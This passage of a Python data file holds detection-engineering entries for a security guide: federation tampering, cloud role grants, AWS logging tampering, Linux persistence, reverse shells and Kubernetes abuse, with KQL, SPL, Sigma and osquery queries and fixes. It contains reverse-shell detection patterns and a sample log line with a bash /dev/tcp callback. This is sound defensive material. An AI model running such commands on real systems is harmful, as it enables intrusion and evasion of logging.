       "Attackers either steal the AD FS signing certificate (Golden SAML) or, with Global Admin, add a new federated domain or change federation settings to trust their own identity provider. Scattered Spider did the latter.",
  sig=["'Set domain authentication', 'Set federation settings on domain' or 'Add unverified domain' / 'Verify domain' in Entra audit logs",
       "Sign-ins via federation for which the AD FS server has no matching token-issuance event (1200/1202)",
       "AD FS: export of the token-signing certificate; access to the DKM container in AD (4662 on CN=ADFS)"],
  logs="Entra AuditLogs and SigninLogs; AD FS admin and audit logs (1200, 1202, 70); Security 4662 on the ADFS DKM container.",
  q=dict(
    kql=r"""AuditLogs
| where TimeGenerated > ago(90d)
| where OperationName in ("Set domain authentication", "Set federation settings on domain", "Add unverified domain", "Verify domain", "Add partner to company", "Update domain")
| extend by = tostring(InitiatedBy.user.userPrincipalName), ip = tostring(InitiatedBy.user.ipAddress), domain = tostring(TargetResources[0].displayName)
| project TimeGenerated, OperationName, domain, by, ip, TargetResources""",
    cli=r"""# Which domains are federated, and to what
Get-MgDomain | Select Id, AuthenticationType, IsVerified
Get-MgDomainFederationConfiguration -DomainId corp.example | Select IssuerUri, PassiveSignInUri, SigningCertificate"""),
  fp="Planned migrations between identity providers.",
  fix=["Move off AD FS to cloud authentication where possible; if not, treat AD FS as Tier 0 and protect its signing key in an HSM",
       "Alert on every federation or domain change; require PIM approval for Global Admin and Hybrid Identity Admin",
       "On suspected Golden SAML: rotate the token-signing certificate twice and revoke all sessions"]),

dict(id='cl-roles', sec='cloud', t='Privileged role grants and break-glass use', att=['T1098.003', 'T1078.004'], sev='high',
  lens="The objective in a cloud tenant is a privileged role: Global Administrator, Privileged Role Administrator, Application Administrator. Attackers add themselves or a new account outside PIM, "
       "or use a forgotten break-glass account that has no MFA or monitoring.",
  sig=["'Add member to role' for privileged roles not through PIM (no 'Add eligible member' first)",
       "New user created and given a role within minutes", "Any sign-in by a break-glass account"],
  logs="Entra AuditLogs (RoleManagement), SigninLogs.",
  q=dict(
    kql=r"""let privileged = dynamic(["Global Administrator", "Privileged Role Administrator", "Privileged Authentication Administrator", "Application Administrator", "Cloud Application Administrator", "Hybrid Identity Administrator", "Exchange Administrator", "Security Administrator", "User Administrator"]);
AuditLogs
| where TimeGenerated > ago(30d) and OperationName in ("Add member to role", "Add member to role outside of PIM (permanent)", "Add eligible member to role")
| extend role = tostring(TargetResources[0].modifiedProperties[1].newValue), who = tostring(TargetResources[2].userPrincipalName), member = tostring(TargetResources[0].userPrincipalName), by = tostring(InitiatedBy.user.userPrincipalName)
| where role has_any (privileged)
| project TimeGenerated, OperationName, role, member, by, InitiatedBy""",
    spl=r"""index=azure sourcetype="azure:monitor:aad" category=SignInLogs properties.userPrincipalName IN ("breakglass1@corp.example", "breakglass2@corp.example")
| table _time properties.userPrincipalName properties.ipAddress properties.appDisplayName properties.status.errorCode"""),
  fp="Planned role changes; PIM activations (those are 'Add member to role completed (PIM activation)').",
  fix=["Privileged roles only through PIM with approval and MFA; no permanent Global Admins except break-glass",
       "Break-glass accounts with FIDO2 keys in a safe and an alert on every sign-in"]),

dict(id='cl-aws', sec='cloud', t='AWS: logging off, keys minted, policies widened', att=['T1685.002', 'T1098.001', 'T1078.004'], sev='critical',
  lens="In AWS the quiet moves are: stop or blind CloudTrail, create access keys for another user (persistence that looks like that user), give a login profile to a programmatic user, "
       "attach AdministratorAccess, then read secrets. GuardDuty and Security Hub get disabled along the way.",
  sig=["StopLogging, DeleteTrail, UpdateTrail, PutEventSelectors (narrowing what is logged); DeleteDetector or UpdateDetector in GuardDuty",
       "CreateAccessKey where the caller is not the key's user; CreateLoginProfile or UpdateLoginProfile",
       "AttachUserPolicy/AttachRolePolicy with AdministratorAccess; PutUserPolicy with Action \"*\"",
       "A burst of secretsmanager:GetSecretValue or ssm:GetParameter with decryption"],
  logs="CloudTrail management events, ideally an organisation trail in a separate logging account.",
  q=dict(
    sigma=r"""title: AWS logging or threat detection disabled
status: stable
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName:
      - 'StopLogging'
      - 'DeleteTrail'
      - 'UpdateTrail'
      - 'PutEventSelectors'
      - 'DeleteDetector'
      - 'DeleteFlowLogs'
      - 'DisableSecurityHub'
  condition: selection
falsepositives:
  - Planned changes to logging architecture
level: critical
tags:
  - attack.defense-impairment
  - attack.t1685.002""",
    kql=r"""AWSCloudTrail
| where TimeGenerated > ago(30d)
| where EventName in ("StopLogging", "DeleteTrail", "UpdateTrail", "PutEventSelectors", "DeleteDetector", "DeleteFlowLogs", "DisableSecurityHub")
     or (EventName == "CreateAccessKey" and tostring(parse_json(RequestParameters).userName) != UserIdentityUserName and isnotempty(tostring(parse_json(RequestParameters).userName)))
     or (EventName in ("CreateLoginProfile", "UpdateLoginProfile"))
     or (EventName in ("AttachUserPolicy", "AttachRolePolicy", "AttachGroupPolicy") and RequestParameters has "AdministratorAccess")
| project TimeGenerated, EventName, UserIdentityArn, SourceIpAddress, UserAgent, RequestParameters, ErrorCode""",
    spl=r"""index=aws sourcetype=aws:cloudtrail eventName=GetSecretValue earliest=-24h
| stats count dc(requestParameters.secretId) as secrets by userIdentity.arn sourceIPAddress
| where secrets > 10
| sort - secrets"""),
  ev=['eventSource=cloudtrail.amazonaws.com eventName=StopLogging userIdentity.arn="arn:aws:iam::111122223333:user/ci-deploy" sourceIPAddress=185.220.101.4', 'eventSource=cloudtrail.amazonaws.com eventName=LookupEvents'],
  fp="Infrastructure-as-code pipelines updating trails (from known roles).",
  fix=["Organisation trail in a dedicated logging account with an SCP denying StopLogging/DeleteTrail to member accounts",
       "No long-lived IAM user keys; SCPs to deny CreateAccessKey except for a break-glass path",
       "GuardDuty delegated admin in the security account so workload accounts cannot disable it"]),

# ------------------------------------------------------------------ Linux and containers
dict(id='lx-persist', sec='linux', t='Linux persistence: cron, systemd, SSH keys, preload', att=['T1053.003', 'T1543.002', 'T1098.004', 'T1574.006'], sev='high',
  lens="On Linux servers and appliances persistence is a line in a file: a cron entry, a systemd unit with a name like dbus-update.service, an extra key in authorized_keys, or /etc/ld.so.preload loading a library into every process (the trick behind several rootkits). "
       "Cryptominers and state actors use the same handful of places.",
  sig=["Writes to /etc/ld.so.preload (almost never legitimate)", "New or changed files in /etc/cron*, /var/spool/cron, /etc/systemd/system, ~/.config/systemd/user",
       "authorized_keys modified for root or service accounts", "Units or cron jobs that run curl|sh, base64 -d, or binaries in /tmp, /dev/shm or /var/tmp"],
  logs="auditd file watches, EDR for Linux, osquery; file-integrity monitoring.",
  q=dict(
    sigma=r"""title: Change to a Linux persistence location
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection:
    TargetFilename|startswith:
      - '/etc/ld.so.preload'
      - '/etc/cron.d/'
      - '/var/spool/cron/'
      - '/etc/systemd/system/'
      - '/etc/rc.local'
  selection_keys:
    TargetFilename|endswith: '/.ssh/authorized_keys'
  condition: selection or selection_keys
falsepositives:
  - Configuration management (Ansible, Puppet, Chef) and package installs
level: medium
tags:
  - attack.persistence
  - attack.t1053.003""",
    cli=r"""# auditd rules (add to /etc/audit/rules.d/persistence.rules, then augenrules --load)
-w /etc/ld.so.preload -p wa -k preload
-w /etc/cron.d/ -p wa -k cron
-w /var/spool/cron/ -p wa -k cron
-w /etc/systemd/system/ -p wa -k systemd
-w /root/.ssh/authorized_keys -p wa -k sshkeys
# triage a host
cat /etc/ld.so.preload 2>/dev/null; ls -la /etc/cron* /var/spool/cron/crontabs; systemctl list-unit-files --state=enabled | head -50
grep -rE "curl|wget|base64 -d|/dev/shm|/tmp/" /etc/cron* /var/spool/cron /etc/systemd/system 2>/dev/null""",
    osq=r"""SELECT * FROM crontab WHERE command LIKE '%curl%' OR command LIKE '%wget%' OR command LIKE '%/tmp/%' OR command LIKE '%/dev/shm%' OR command LIKE '%base64%';
SELECT id, description, fragment_path FROM systemd_units WHERE fragment_path LIKE '/etc/systemd/system/%' AND active_state = 'active';
SELECT * FROM file WHERE path = '/etc/ld.so.preload';"""),
  ev=['type=file_event TargetFilename="/etc/ld.so.preload" Image="/usr/bin/bash"', 'type=file_event TargetFilename="/etc/hosts" Image="/usr/bin/vim"'],
  fp="Config management and package managers; filter by their processes.",
  fix=["File-integrity monitoring on these paths; immutable infrastructure where servers are rebuilt, not patched",
       "SSH keys managed centrally (no hand-edited authorized_keys); root login disabled"]),

dict(id='lx-shell', sec='linux', t='Reverse shells and in-memory execution on Linux', att=['T1059.004', 'T1620'], sev='high',
  lens="After exploiting a web app or service, the operator calls back with a shell: bash -i >& /dev/tcp/host/port, nc -e, a python or perl one-liner, or socat. "
       "Payloads land in /dev/shm or /tmp, or run from memory via memfd_create so no file exists. Web server users (www-data, tomcat) spawning shells is the giveaway.",
  sig=["Command lines containing /dev/tcp/ or /dev/udp/, 'nc -e', 'ncat -e', 'socat exec:', 'pty.spawn'",
       "Processes executing from /dev/shm, /tmp, /var/tmp, or from memfd: (shown as /memfd:… (deleted))",
       "www-data, apache, nginx, tomcat or a database user starting sh, bash, python or curl"],
  logs="auditd execve, EDR for Linux, process accounting.",
  q=dict(
    sigma=r"""title: Linux reverse shell pattern
status: stable
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - '/dev/tcp/'
      - '/dev/udp/'
      - 'nc -e '
      - 'ncat -e '
      - 'socat exec:'
      - 'pty.spawn('
      - 'sh -i >&'
  condition: selection
falsepositives:
  - Health-check scripts that test ports with /dev/tcp (no shell redirection)
level: high
tags:
  - attack.execution
  - attack.t1059.004""",
    cli=r"""# processes running from deleted or memory-only files
ls -l /proc/*/exe 2>/dev/null | grep -E "deleted|memfd"
# web and database users with interactive children
ps -eo user,pid,ppid,cmd --forest | grep -E "^(www-data|apache|nginx|tomcat|postgres|mysql) " | grep -E "sh |bash|python|perl|curl|wget"
# auditd: log every execve by web users (uid of www-data, here 33)
-a always,exit -F arch=b64 -S execve -F uid=33 -k webexec""",
    osq=r"""SELECT p.pid, p.name, p.path, p.cmdline, u.username FROM processes p JOIN users u USING (uid)
WHERE p.on_disk = 0 OR p.path LIKE '/tmp/%' OR p.path LIKE '/dev/shm/%' OR p.path LIKE '/var/tmp/%' OR p.cmdline LIKE '%/dev/tcp/%';"""),
  ev=['type=execve Image="/usr/bin/bash" CommandLine="bash -c \'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1\'" User="www-data"', 'type=execve Image="/usr/bin/bash" CommandLine="bash /opt/app/healthcheck.sh" User="app"'],
  fp="Port-check scripts using /dev/tcp without an interactive shell.",
  fix=["Web and service users with no shell (nologin) and no outbound internet; mount /tmp and /dev/shm noexec",
       "auditd or eBPF-based EDR on every internet-facing Linux host"]),

dict(id='lx-k8s', sec='linux', t='Kubernetes: privileged pods, exec and stolen tokens', att=['T1610', 'T1611', 'T1528'], sev='high',
  lens="In a cluster the attacker wants the node and the cloud behind it: create a privileged pod with the host filesystem mounted, exec into a running pod, read the service account token, "
       "or reach the cloud metadata service (169.254.169.254) from a pod to take the node's cloud identity.",
  sig=["Pod create with securityContext.privileged true, hostPID, hostNetwork, or hostPath mounts of / or /var/run/docker.sock",
       "pods/exec by a human user or an unexpected service account; anonymous requests that are allowed",
       "Pods connecting to 169.254.169.254 where IMDSv2/workload identity should be used; secrets listed cluster-wide"],
  logs="Kubernetes API audit logs (EKS/AKS/GKE control-plane logging), Falco or another runtime sensor.",
  q=dict(
    spl=r"""index=k8s sourcetype=kube:apiserver:audit verb=create objectRef.resource=pods
| spath path=requestObject.spec.containers{}.securityContext.privileged output=priv
| spath path=requestObject.spec.hostPID output=hostpid
| spath path=requestObject.spec.volumes{}.hostPath.path output=hostpath
| where priv="true" OR hostpid="true" OR isnotnull(hostpath)
| table _time user.username objectRef.namespace objectRef.name priv hostpid hostpath""",
    kql=r"""// AKS control-plane audit
AzureDiagnostics
| where Category == "kube-audit"
| extend log = parse_json(log_s)
| where log.verb == "create" and log.objectRef.subresource == "exec" or (log.verb == "create" and log.objectRef.resource == "pods" and tostring(log.requestObject) has_any ('"privileged":true', '"hostPID":true', '"hostPath"'))
| project TimeGenerated, user = tostring(log.user.username), ns = tostring(log.objectRef.namespace), name = tostring(log.objectRef.name), verb = tostring(log.verb), sub = tostring(log.objectRef.subresource)""",
    cli=r"""# Falco rules worth having on: Terminal shell in container, Launch Privileged Container, Contact cloud metadata service from container,
# Read sensitive file untrusted, Create HostNetwork Pod
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true or .spec.hostPID==true) | .metadata.namespace+"/"+.metadata.name'
kubectl auth can-i --list --as=system:serviceaccount:default:default"""),
  fp="System daemonsets (CNI, CSI, monitoring agents) run privileged by design — allow-list by namespace and image.",
  fix=["Pod Security Admission 'restricted' for application namespaces; deny privileged and hostPath outside kube-system",
       "Workload identity instead of node credentials; block pod access to the metadata service; disable automounting of service account tokens where not needed",
       "Turn on control-plane audit logging — many managed clusters have it off by default"]),
]
